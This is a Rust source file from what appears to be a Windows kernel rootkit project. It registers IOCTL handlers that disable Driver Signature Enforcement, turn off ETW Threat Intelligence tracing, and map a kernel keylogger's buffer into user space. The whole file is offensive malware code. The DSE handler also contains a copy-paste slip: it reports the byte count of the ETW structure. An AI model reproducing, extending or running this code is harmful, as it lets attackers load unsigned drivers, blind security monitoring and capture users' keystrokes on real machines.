use {
    log::error,
    alloc::boxed::Box,
    wdk_sys::{
        IO_STACK_LOCATION, IRP, 
        STATUS_SUCCESS, STATUS_UNSUCCESSFUL
    },
};

use {
    crate::utils::{
        ioctls::IoctlManager, 
        get_input_buffer
    }, 
    common::{
        ioctls::{ENABLE_DSE, ETWTI, KEYLOGGER}, 
        structs::{DSE, ETWTI}
    },
};

/// Holds the user-mode address for keylogger functionality.
/// 
/// This static variable stores the address returned by the keylogger to map 
/// kernel memory to user space.
pub static mut USER_ADDRESS: usize = 0; 

/// Registers the IOCTL handlers for miscellaneous operations.
/// 
/// This function registers handlers for several miscellaneous operations, such as enabling or disabling 
/// Driver Signature Enforcement (DSE), enabling/disabling ETW tracing, and starting a keylogger.
/// 
/// # Supported IOCTLs
/// 
/// * **ENABLE_DSE** - Enables or disables Driver Signature Enforcement (DSE).
/// * **KEYLOGGER** - Retrieves the user-mode address for the keylogger functionality.
/// * **ETWTI** - Enables or disables ETW tracing.
/// 
/// # Arguments
/// 
/// * `ioctls` - A mutable reference to an `IoctlManager` where the IOCTL handlers will be registered.
pub fn register_misc_ioctls(ioctls: &mut IoctlManager) {
    // Enable/Disable DSE (Driver Signature Enforcement).
    ioctls.register_handler(ENABLE_DSE, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION| {
        unsafe {
            // Get the input buffer containing DSE information.
            let target_dse = get_input_buffer::<DSE>(stack)?;

            // Call to enable or disable DSE based on the input.
            let status = shadowx::Dse::set_dse_state((*target_dse).enable)?;

            // Set the number of bytes returned to the size of the ETWTI structure.
            (*irp).IoStatus.Information = size_of::<ETWTI>() as u64;
            Ok(status)
        }
    }));

    // Start Keylogger: Maps the address for keylogger functionality to user space.
    ioctls.register_handler(KEYLOGGER, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION| {
        unsafe {
            // If the USER_ADDRESS has not been set, retrieve it using the keylogger function.
            if USER_ADDRESS == 0 {
                USER_ADDRESS = match shadowx::Keylogger::get_user_address_keylogger() {
                    Ok(addr) => addr as usize,
                    Err(err) => {
                        // Log the error and return a failure status if keylogger setup fails.
                        error!("Error get_user_address_keylogger: {err}");
                        return Ok(STATUS_UNSUCCESSFUL);
                    },
                };
            }
    
            // Write the USER_ADDRESS to the output buffer provided by the IRP.
            let output_buffer = (*irp).AssociatedIrp.SystemBuffer;
            if !output_buffer.is_null() {
                *(output_buffer as *mut usize) = USER_ADDRESS;
            }
    
            // Set the number of bytes returned to the size of a `usize`.
            (*irp).IoStatus.Information = size_of::<usize>() as u64;
            Ok(STATUS_SUCCESS)
        }
    }));

    // Enable/Disable ETWTI.
    ioctls.register_handler(ETWTI, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION| {
        unsafe {
            // Get the input buffer containing ETW tracing information.
            let target_etw = get_input_buffer::<ETWTI>(stack)?;

            // Call to enable or disable ETW tracing based on the input.
            let status = shadowx::Etw::etwti_enable_disable((*target_etw).enable)?;

            // Set the number of bytes returned to the size of the ETWTI structure.
            (*irp).IoStatus.Information = size_of::<ETWTI>() as u64;         
            Ok(status)
        }
    }));
}
